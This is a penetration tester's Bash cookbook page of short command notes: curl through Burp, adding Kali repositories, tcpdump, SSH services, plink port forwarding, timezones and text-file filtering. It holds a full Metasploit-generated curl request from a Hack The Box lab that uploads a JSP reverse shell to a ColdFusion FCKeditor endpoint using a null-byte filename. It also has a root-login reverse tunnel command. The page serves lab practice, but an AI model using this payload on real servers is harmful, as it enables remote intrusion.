---
layout: default
title: Bash
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

## References

[Expect command](https://likegeeks.com/expect-command/)

[Passing args to expect script](https://stackoverflow.com/questions/17059682/how-to-pass-argument-in-expect-through-the-command-line-in-a-shell-script)

[Bash scripting command args](https://tecadmin.net/tutorial/bash-scripting/bash-command-arguments/)

## Sending cURL requests to Burp for testing

Assuming Burp is configured to listen on `8080`:

```
$ curl --proxy 127.0.0.1:8080 http://127.0.0.1/
```

## cURL adding headers
```
$ curl http://127.0.0.1/ -H 'Host: xxx' -H 'Content-Type: xxx'
```

## cURL request to upload a file
```
curl http://10.x.x.x/ --upload-file file.ext
```

## cURL request generated by Metasploit for HTB Artic

```
curl -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1:8500' -H $'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' -H $'Content-Type: multipart/form-data; boundary=_Part_144_2215137543_3041307620' -H $'Content-Length: 1586' -H $'Connection: close' \
    --data-binary $'--_Part_144_2215137543_3041307620\x0d\x0aContent-Disposition: form-data; name=\"newfile\"; filename=\"EDZBLJVG.txt\"\x0d\x0aContent-Type: application/x-java-archive\x0d\x0a\x0d\x0a<%@page import=\"java.lang.*\"%>\x0d\x0a<%@page import=\"java.util.*\"%>\x0d\x0a<%@page import=\"java.io.*\"%>\x0d\x0a<%@page import=\"java.net.*\"%>\x0d\x0a\x0d\x0a<%\x0d\x0a  class StreamConnector extends Thread\x0d\x0a  {\x0d\x0a    InputStream dq;\x0d\x0a    OutputStream rp;\x0d\x0a\x0d\x0a    StreamConnector( InputStream dq, OutputStream rp )\x0d\x0a    {\x0d\x0a      this.dq = dq;\x0d\x0a      this.rp = rp;\x0d\x0a    }\x0d\x0a\x0d\x0a    public void run()\x0d\x0a    {\x0d\x0a      BufferedReader zw  = null;\x0d\x0a      BufferedWriter zto = null;\x0d\x0a      try\x0d\x0a      {\x0d\x0a        zw  = new BufferedReader( new InputStreamReader( this.dq ) );\x0d\x0a        zto = new BufferedWriter( new OutputStreamWriter( this.rp ) );\x0d\x0a        char buffer[] = new char[8192];\x0d\x0a        int length;\x0d\x0a        while( ( length = zw.read( buffer, 0, buffer.length ) ) > 0 )\x0d\x0a        {\x0d\x0a          zto.write( buffer, 0, length );\x0d\x0a          zto.flush();\x0d\x0a        }\x0d\x0a      } catch( Exception e ){}\x0d\x0a      try\x0d\x0a      {\x0d\x0a        if( zw != null )\x0d\x0a          zw.close();\x0d\x0a        if( zto != null )\x0d\x0a          zto.close();\x0d\x0a      } catch( Exception e ){}\x0d\x0a    }\x0d\x0a  }\x0d\x0a\x0d\x0a  try\x0d\x0a  {\x0d\x0a    String ShellPath = \"cmd.exe\";\x0d\x0a    Socket socket = new Socket( \"127.0.0.1\", 4444 );\x0d\x0a    Process process = Runtime.getRuntime().exec( ShellPath );\x0d\x0a    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();\x0d\x0a    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();\x0d\x0a  } catch( Exception e ) {}\x0d\x0a%>\x0d\x0a\x0d\x0a--_Part_144_2215137543_3041307620--' \
    $'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/MHEDXH.jsp%00'
```

|Command|Description|
|:---|:---|
|```$ cat /etc/os-release```&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|Print OS release details|

## Adding Kali Repos to Ubuntu
```
cd /etc/apt
sudo cp sources.list sources.list.original

sudo tee -a /etc/apt/sources.list<<EOF
deb https://http.kali.org/kali kali-rolling main non-free contrib
deb-src https://http.kali.org/kali kali-rolling main non-free contrib
EOF

sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED444FF07D8D0BF6
sudo apt update
```

## Listen for incoming pings
```
sudo tcpdump -i tun0 icmp
```

## Managing services
Start/stop the ssh service:
```
sudo service ssh status                 // Check ssh service status
sudo service ssh {start | stop}         // Start ssh service
nmap -p22 127.0.0.1                     // Check port status
```

## Port forwarding
*Things look like they hang, keep pressing enter and you should get output.*

Port forwarding on windows, use `plink.exe`. Download `plink.exe` to the target. On Kali, install an SSH server and edit `/etc/ssh/sshd_config`. Uncomment `PermitRootLogin` and set to `yes`:
```
PermitRootLogin yes
```

Start/restart the SSH service:
```
sudo service ssh {start | restart}
```

On the target, run:
```
plink.exe -l root -pw <password> -R 445:127.0.0.1:445 10.x.x.x
```

If the target goes blank, keep hitting enter until you see a new prompt (your Kali prompt). 

-R port forward 

For port 445 on this machine, 


Also look at `ProxyChains`.


## Timezones
Show timezone information:
```
timedatectl
```
```
               Local time: Tue 2020-06-09 06:46:11 EDT
           Universal time: Tue 2020-06-09 10:46:11 UTC
                 RTC time: Tue 2020-06-09 10:46:09
                Time zone: America/New_York (EDT, -0400)
System clock synchronized: no
              NTP service: inactive
          RTC in local TZ: no
```

Change timezone:
```
timedatectl list-timezones
timedateclt set-timezone <new timezone>
```

Change time and date:
```
sudo date --set "Tuesday, June 9, 2020 10:59:14 AM"
```

## Remove all lines less than *n* characters
Remove passwords less than *n* characters from a password file:
```
sed -r '/^.{,5}$/d' wordlists/fasttrack-ncsc-custom-passwords > wordlists/passwords-five-chars-plus
```

## Finding entries in one file that are not in the other
Sort the files first.
```
// Find lines only in file1.
comm -23 file1 file2 

// Find lines only in file2.
comm -13 file1 file2 

// Find lines common to both files
comm -12 file1 file2 
```

## General grep
```
// Recursive, case-insensitive grep with coloured output.
grep --color=always -ri '^word$' .

// Grep multiple patterns with exact word match.
cat common.txt | grep '^table$\|^readme$'
```

## Find 

```
find / -mtime -20 -exec ls -lrt -d -1 "$PWD"/{*,.*} {} \; 2>/dev/null > /tmp/x
```

## Adding folders to path
```
nano ~/.bashrc
source ~/.bashrc
```